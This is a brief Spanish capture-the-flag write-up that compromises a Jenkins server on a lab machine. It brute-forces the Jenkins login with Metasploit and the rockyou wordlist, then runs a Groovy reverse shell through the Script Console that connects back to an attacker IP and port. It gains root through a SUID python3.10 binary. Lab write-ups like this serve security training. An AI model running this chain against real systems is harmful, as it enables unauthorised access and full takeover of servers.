## Reconocimiento:

Puerto 8080 : HTTP

Tenemos un http con Jetty version 10.0.20

En la web hay un Jenkins_login. Buscando en metasploit encuentro algo:

```bash
msfconsole -q 
search jenkins
use scanner/http/jenkins_login
```

Lo configuro:

```bash
set RHOSTS IP
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Dentro del panel:

```bash
Manage Jenkins > Script Console
```

Nos mandamos una shell que saco del writeup de Dise0:

```bash
String host="<IP>";
int port=<PORT>;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Escalada:

Listo permisos SUID

```bash
find / -type f -perm -4000 2>/dev/null
```

Interesa:

```bash
/usr/bin/python3.10
```

Se ve que podemos ejecutar python con privilegios de root, asi que lo utilizo:

```bash
python3.10 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Listo.
